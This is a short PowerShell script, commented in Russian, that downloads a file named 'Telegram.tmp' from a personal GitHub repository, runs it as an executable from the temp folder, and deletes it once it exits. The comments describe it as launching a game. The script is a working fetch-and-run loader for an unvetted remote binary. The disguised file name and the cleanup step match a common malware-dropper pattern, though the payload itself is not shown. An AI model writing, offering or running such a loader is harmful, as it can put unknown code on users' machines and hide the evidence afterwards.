$ErrorActionPreference = "Stop"

$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/Telegram.tmp"
$TempFile = Join-Path ([IO.Path]::GetTempPath()) "Telegram.tmp"

# Скачиваем файл
Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing

# Настраиваем запуск через .NET
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $TempFile
$psi.UseShellExecute = $false          # Отключаем оболочку Windows
$psi.RedirectStandardOutput = $false   # Не перенаправляем вывод (GUI-приложению не нужно)
$psi.RedirectStandardError = $false
$psi.CreateNoWindow = $false           # Окно игры должно быть видимым

# Запускаем процесс
$proc = [System.Diagnostics.Process]::Start($psi)

# Ждём завершения
$proc.WaitForExit()

# Удаляем файл после закрытия
Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
